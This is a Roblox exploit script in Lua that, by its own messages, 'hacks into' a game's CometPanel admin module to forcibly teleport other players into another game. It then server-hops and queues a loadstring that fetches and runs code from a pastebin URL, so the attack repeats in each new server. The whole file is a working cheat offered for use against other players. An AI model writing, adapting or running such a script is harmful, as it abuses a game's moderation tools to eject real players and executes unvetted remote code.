print("reworken teleporter initialized..")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local placeId = game.PlaceId
local currentJobId = game.JobId
local LocalPlayer = Players.LocalPlayer

print("hacking into cometpanel..")
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local CometPanel = PlayerGui:WaitForChild("CometPanel")
local Assets = CometPanel:WaitForChild("Assets")
local Utility = Assets:WaitForChild("Utility")

local utility = require(Utility)

-- Keep only selected players other than yourself.
print("selecting players..")
local selectedPlayers = utility:GetPlayersFromSelection()
local targets = {}

print("doing others instead of all..")
for _, player in ipairs(selectedPlayers) do
    if player ~= LocalPlayer then
        table.insert(targets, player)
    end
end

print("teleporting..")

utility:Fire({
    Players = targets,
    GameID = 125328885809247
})

print("waiting for players to teleport...")

repeat
    task.wait(0.5)

    local allTeleported = true

    for _, player in ipairs(targets) do
        if player and player.Parent == game:GetService("Players") then
            allTeleported = false
            break
        end
    end
until allTeleported

print("all players teleported; server hopping...")

local success, result = pcall(function()
    return game:HttpGet(
        "https://games.roblox.com/v1/games/" .. placeId ..
        "/servers/Public?sortOrder=Asc&limit=100"
    )
end)

if success then
    local data = HttpService:JSONDecode(result)
    local servers = {}

    for _, server in ipairs(data.data) do
        if server.id ~= currentJobId and server.playing < server.maxPlayers then
            table.insert(servers, server.id)
        end
    end

    if #servers > 0 then
        local serverId = servers[math.random(1, #servers)]

        if typeof(queue_on_teleport) == "function" then
            queue_on_teleport("loadstring(game:HttpGet('https://pastebin.com/raw/N4JJqrNx'))()")
        elseif typeof(queueonteleport) == "function" then
            queueonteleport("loadstring(game:HttpGet('https://pastebin.com/raw/N4JJqrNx'))()")
        end

        TeleportService:TeleportToPlaceInstance(placeId, serverId, Players.LocalPlayer)
    end
end
